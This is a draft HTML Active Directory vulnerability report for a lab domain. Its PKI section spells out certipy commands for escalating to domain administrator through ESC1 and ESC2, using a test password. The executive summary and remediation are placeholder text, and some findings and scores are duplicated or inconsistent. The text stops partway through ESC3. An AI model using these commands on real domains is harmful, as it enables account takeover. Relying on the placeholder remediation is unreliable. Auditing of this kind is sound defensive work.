<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test.local Vulnerability Report</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/x-icon" href="/Private/Report/Images/favicon-32x32.png">
</head>

<body>
    <div class="banner">
        <img src="./Images/kerberos-text2.png" alt="ADScanner logo" class="banner-img">
    </div>
    <div class="main-header">Domain vulnerability report for test.local</div>
    <!-- Risk overall section -->
    <div class="risk-overall">
        <div class="left-image"> <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
        </div>
        <div class="risk-overall-text">
            <h1>Domain risk level: 1856 / 100</h1>
            <p>The maximum score is 100, anything above this presents a significant risk to ransomware.</p>
            <p>Attackers will always exploit the path of least resistance (higher scores) - low hanging fruit.</p>
            <a href="#category-summary">See score breakdown table</a>
        </div>
    </div>
    <!-- Executive summary section -->
    <div class="summary">
        <!-- Left section for the tables -->
        <div class="left-section">
            <div class="table-container">
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th colspan="2">Details when ran</th>
                        </tr>
                        <tr>
                            <td>Domain Assessed</td>
                            <td>test.local</td>
                        </tr>
                        <tr>
                            <td>Ran as User</td>
                            <td>TEST\jack</td>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Ran on Host</td>
                            <td>CA.test.local</td>
                        </tr>
                        <tr>
                            <td>Date and Time</td>
                            <td>03/14/2024 15:28:11</td>
                        </tr>
                        <tr>
                            <td>Time to Run</td>
                            <td>53.2504325</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div class="table-container">
                <table class="summary-table" id="category-summary">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Risk Score</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Kerberos</td>
                            <td class="category-riskcritical">258</td>
                        </tr>
                        <tr>
                            <td>PKI</td>
                            <td class="category-riskcritical">600</td>
                        </tr>
                        <tr>
                            <td>RBAC</td>
                            <td class="category-riskcritical">159</td>
                        </tr>
                        <tr>
                            <td>ACLs</td>
                            <td class="category-riskcritical">425</td>
                        </tr>
                        <tr>
                            <td>Passwords</td>
                            <td class="category-riskcritical">164</td>
                        </tr>
                        <tr>
                            <td>MISC</td>
                            <td class="category-riskcritical">110</td>
                        </tr>
                        <tr>
                            <td>Legacy</td>
                            <td class="category-riskcritical">140</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <!-- Right section for the executive summary -->
        <div class="executive-summary">
            <h2>Executive Summary (GPT to contextualize)</h2>
            <p>ADscanner was commissioned to perform a vulnerability assessment against the test.local Active Directory
                domain to ensure correct security configuration and operation of the Directory.
                The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                network could be exploited by a determined attacker deploying ransomware and malware.</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill
                the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the
                rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this
                in...ChatGPT will fill the rest of this in...</p>
        </div>
    </div>
    <!-- Risk prioritisation section -->
    <div class="risk-summary-container">
        <div class="risk-summary-heading">
            <h2>Risk Prioritisation Summary</h2>
            <p>The table below summarizes the number and severity of findings in order of decreasing risk. Full
                details can be found by clicking on each vulnerability which will take you to the relevant technical
                section.</p>
        </div>
        <table class="risk-prioritisation-summary">
            <thead>
                <tr>
                    <th class="risk-column">Risk</th>
                    <th class="technique-column">Issue</a></th>
                    <th class="category-column">Category</th>
                    <th class="score-column">Score</th>
                </tr>
            </thead>
            <tbody>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC8">ESC8</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-Kerberoastable-user-with-a-weak-password">Highly privileged
                            Kerberoastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC6">ESC6</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC7">ESC7</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-DCSync-rights">Low privileged principal has DCSync
                            rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-ASREP-roastable-user-with-a-weak-password">Highly privileged
                            ASREP-roastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC3">ESC3</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC2">ESC2</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC1">ESC1</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC4">ESC4</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#ESC5">ESC5</a></td>
                    <td>PKI</td>
                    <td>50</td>
                </tr>
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#Highly-privileged-user-does-not-require-a-password">Highly privileged user does not
                            require a password</a></td>
                    <td>Passwords</td>
                    <td>40</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-RBCD-rights">Low privileged principal has
                            dangerous RBCD rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-principal-has-dangerous-rights">Low privileged principal has dangerous
                            rights</a></td>
                    <td>ACLs</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Unrestricted-outbound-access">Unrestricted outbound access</a></td>
                    <td>MISC</td>
                    <td>35</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Constrained-delegation">Constrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Outdated-Operating-Systems-found">Outdated Operating Systems found</a></td>
                    <td>Legacy</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Resource-based-constrained-delegation">Resource-based constrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Unconstrained-delegation">Unconstrained delegation</a></td>
                    <td>Kerberos</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Spooler-service-is-enabled-(authentication-coercion)-">Spooler service is enabled
                            (authentication coercion) </a></td>
                    <td>MISC</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Modifiable-logon-script---see-baby2-for-example-exploitation">Modifiable logon script
                            - see baby2 for example exploitation</a></td>
                    <td>ACLs</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Plaintext-credentials-found-readable-by-low-privileged-user">Plaintext credentials
                            found readable by low privileged user</a></td>
                    <td>Passwords</td>
                    <td>30</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#SMBv1-is-enabled-on-computers">SMBv1 is enabled on computers</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Password-length-requirement-is-less-than-12-characters">Password length requirement is
                            less than 12 characters</a></td>
                    <td>Passwords</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#LLMNR-is-vulnerable-to-layer-2-poisoning-attacks">LLMNR is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-Kerberoastable-user-with-a-weak-password">Low privileged Kerberoastable
                            user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#NBT-NS-is-vulnerable-to-layer-2-poisoning-attacks">NBT-NS is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#mDNS-is-vulnerable-to-layer-2-poisoning-attacks">mDNS is vulnerable to layer 2
                            poisoning attacks</a></td>
                    <td>Legacy</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Low-privileged-ASREP-roastable-user-with-a-weak-password">Low privileged
                            ASREP-roastable user with a weak password</a></td>
                    <td>Kerberos</td>
                    <td>25</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Reversible-encryption-is-enabled">Reversible encryption is enabled</a></td>
                    <td>Passwords</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Password-complexity-requirement-is-not-enabled">Password complexity requirement is not
                            enabled</a></td>
                    <td>Passwords</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Schema-Admins-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Schema
                            Admins group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Domain-anonymous-access-is-permitted-allowing-anonymous-access-to-the-domain">Domain
                            anonymous access is permitted allowing anonymous access to the domain</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Local-anonymous-access-is-permitted-allowing-anonymous-access-to-the-system">Local
                            anonymous access is permitted allowing anonymous access to the system</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Enterprise-Admins-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Enterprise
                            Admins group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Inactive/stale-accounts-are-not-disabled-in-privileged-groups">Inactive/stale accounts
                            are not disabled in privileged groups</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="high">
                    <td>High</td>
                    <td><a href="#Server-Operators-group-does-not-meet-the-benchmark-(maximum-0-users-required).">Server
                            Operators group does not meet the benchmark (maximum 0 users required).</a></td>
                    <td>RBAC</td>
                    <td>20</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#SMB-signing-is-not-enforced">SMB signing is not enforced</a></td>
                    <td>MISC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#LDAP-signing-or-channel-binding-is-not-enforced">LDAP signing or channel binding is
                            not enforced</a></td>
                    <td>MISC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a
                            href="#Highly-privileged-account-does-not-have-the-'Account-is-sensitive-and-cannot-be-delegated'-flag-set">Highly
                            privileged account does not have the 'Account is sensitive and cannot be delegated' flag
                            set</a></td>
                    <td>RBAC</td>
                    <td>19</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Suspicious-/-legacy-admin-account">Suspicious / legacy admin account</a></td>
                    <td>RBAC</td>
                    <td>15</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Standard-user-does-not-require-a-password">Standard user does not require a
                            password</a></td>
                    <td>Passwords</td>
                    <td>15</td>
                </tr>
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#Outdated,-but-disabled,-Operating-Systems-found">Outdated, but disabled, Operating
                            Systems found</a></td>
                    <td>Legacy</td>
                    <td>10</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#The-password-history-count-is-less-than-24">The password history count is less than
                            24</a></td>
                    <td>Passwords</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-ASREP-roastable-user">Disabled ASREP-roastable user</a></td>
                    <td>Kerberos</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-Kerberoastable-account">Disabled Kerberoastable account</a></td>
                    <td>Kerberos</td>
                    <td>9</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Inactive/stale-accounts-are-not-disabled">Inactive/stale accounts are not disabled</a>
                    </td>
                    <td>RBAC</td>
                    <td>5</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Potential-for-non-admin-users-can-add-computers-to-the-domain">Potential for non-admin
                            users can add computers to the domain</a></td>
                    <td>MISC</td>
                    <td>5</td>
                </tr>
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#Disabled-account-does-not-require-a-password">Disabled account does not require a
                            password</a></td>
                    <td>Passwords</td>
                    <td>5</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#Domain-effiency-improvement---empty-Organizational-Units">Domain effiency improvement
                            - empty Organizational Units</a></td>
                    <td>MISC</td>
                    <td>1</td>
                </tr>
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#Domain-effiency-improvement---unlinked-GPOs">Domain effiency improvement - unlinked
                            GPOs</a></td>
                    <td>MISC</td>
                    <td>1</td>
                </tr>
            </tbody>
        </table>
    </div>
    <!-- Technical section -->
    <div class="main-header">Technical section</div>
    <div class="finding-header">Domain info</div>
    <div class="domain-info">
        <p>This section provides a general overview of the Active Directory domain, which can be taken as an indication
            of the size and complexity of the domain. Before appreciating any risks it is important to understand which
            assets within the domain require protecting.</p>
        <table>
            <th>Category</th>
            <th>Value</th>
            <tr>
                <td class="grey">Domain:</td>
                <td>test.local</td>
            </tr>
            <tr>
                <td class="grey">FunctionalLevel:</td>
                <td>Windows2016Domain</td>
            </tr>
            <tr>
                <td class="grey">DomainControllers:</td>
                <td>DC.test.local</td>
            </tr>
            <tr>
                <td class="grey">Users:</td>
                <td>444</td>
            </tr>
            <tr>
                <td class="grey">Groups:</td>
                <td>49</td>
            </tr>
            <tr>
                <td class="grey">Computers:</td>
                <td>11</td>
            </tr>
            <tr>
                <td class="grey">Trusts:</td>
                <td>None</td>
            </tr>
            <tr>
                <td class="grey">OUs:</td>
                <td>225</td>
            </tr>
            <tr>
                <td class="grey">GPOs:</td>
                <td>5</td>
            </tr>
            <tr>
                <td class="grey">CertificateAuthority:</td>
                <td>CA.test.local, test-CA-CA</td>
            </tr>
            <tr>
                <td class="grey">CAtemplates:</td>
                <td>18</td>
            </tr>
            <tr>
                <td class="grey">CertificateTemplates:</td>
                <td>ESC4ACL-template, ESC4-template, ESC3-enrolltemplate, ESC3-template, ESC2-template, ESC1-template,
                    Workstation, DirectoryEmailReplication, DomainControllerAuthentication, KerberosAuthentication,
                    EFSRecovery, EFS, DomainController, WebServer, Machine, User, SubCA, Administrator</td>
            </tr>
        </table>
    </div>

    <div class="finding-header">PKI</div>
    <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="toggle" id="ESC1"><u>ESC1</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in
                                            a vulnerable certificate template and supplying a SAN.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>ESC1-template</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=ESC1-template,CN=Certificate Templates,CN=Public Key
                                                        Services,CN=Services,CN=Configuration,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Enrollee Supplies Subject</td>
                                                    <td>True</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>TEST\Domain Users</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>ReadProperty, WriteProperty, ExtendedRight</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC1 is a vulnerability where a certificate template permits Client
                                                Authentication and allows a low-privileged enrollee to supply a
                                                different username than their own using a Subject Alternative Name (SAN)
                                                without manager approval.
                                                A SAN is an extension that allows multiple identities to be bound to a
                                                certificate beyond just the subject of the certificate. A common use for
                                                SANs is supplying additional host names for HTTPS certificates. For
                                                example, if a web server hosts content for multiple domains, each
                                                applicable domain could be included in the SAN so that the web server
                                                only needs a single HTTPS certificate instead of one for each domain.
                                                This is all well and good for HTTPS certificates, but when combined with
                                                certificates that allow for domain authentication, a dangerous scenario
                                                can arise.</p>
                                            <p>This allows a low-privileged user to enroll in ESC1-template supplying a
                                                SAN of Administrator, and then authenticate as the domain administrator.
                                            </p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable
                                                        certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-1.png" alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template
                                                        specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC1-template -upn administrator@test.local -dns dc.test.local
                                                    </p>
                                                    <p>The low-privileged user can then use this certificate with PKINIT
                                                        to authenticate as the domain administrator and obtain their
                                                        NTLM hash, allowing full impersonation and domain privilege
                                                        escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove ability to supply SAN or restrict who can enroll in cert (to
                                                prviileged users only)</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC2"><u>ESC2</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in
                                            a vulnerable certificate template used for any purpose.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>ESC2-template</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=ESC2-template,CN=Certificate Templates,CN=Public Key
                                                        Services,CN=Services,CN=Configuration,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Any Purpose EKU</td>
                                                    <td>True</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>TEST\Domain Users</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>ReadProperty, WriteProperty, ExtendedRight</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC2 is a vulnerability where a certificate template can be used for ANY
                                                purpose for which a low-privileged user can enroll. Since the
                                                certificate can be used for any purpose, it can be used for the same
                                                technique as with ESC3 for most certificate templates. This invovles
                                                enrolling in the vulnerable certificate template, then using that
                                                enrolled certificate to enroll another certiifcate on behalf of another
                                                user (i.e a domain admin) permitted by the any purpose EKU.</p>
                                            <p>This allows a low-privileged user to enroll in ESC2-template, then use
                                                the certificate to enroll in another certificate template on behalf of a
                                                domain admin (permitted as the certificate can be used for any purpose).
                                            </p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable
                                                        certificate templates using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-1.png" alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template.
                                                    </p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        ESC2-template</p>
                                                    <p>The low-privileged user can then use the ANY purpose certificate
                                                        to request a certificate in the "User" certificate template on
                                                        behalf of a domain administrator</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p
                                                        'Password123!' -ca test-CA-CA -target ca.test.local -template
                                                        User -on-behalf-of 'test\administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin
                                                        certificate with PKINIT to authenticate as the domain
                                                        administrator and obtain their NTLM hash, allowing full
                                                        impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC2 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC3"><u>ESC3</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in
                                            a vulnerable certificate template on behalf of another user.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">Template Name</td>
                                                    <td>ESC3-CRA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">DistinguishedName</td>
                                                    <td>CN=ESC3-CRA,CN=Certificate Templates,CN=Public Key
                                                        Services,CN=Services,CN=Configuration,DC=test,DC=local</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Certificate Request Agent EKU</td>
                                                    <td>True</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">IdentityReference</td>
                                                    <td>TEST\Domain Users</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">ActiveDirectoryRights</td>
                                                    <td>ReadProperty, WriteProperty, ExtendedRight</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC3 is a vulnerability where a certificate template allows a
                                                low-privileged user to enroll for a certificate on behalf of another
                                                user by specifying the Certificate Request Agent EKU. This vulnerability
                                                is present when two certificate templates can be enrolled in by low
                                                privileged user, where, one allows the Certificate Request Agent EKU (to
                                                requesst certificate on behalf of other user) and another allows client
                                                authentication.</p>
                                            <p>This allows a low-privileged user to enroll in ESC3-CRA, then use the
                                                certificate obtained to request an additional certificate (co-sign a
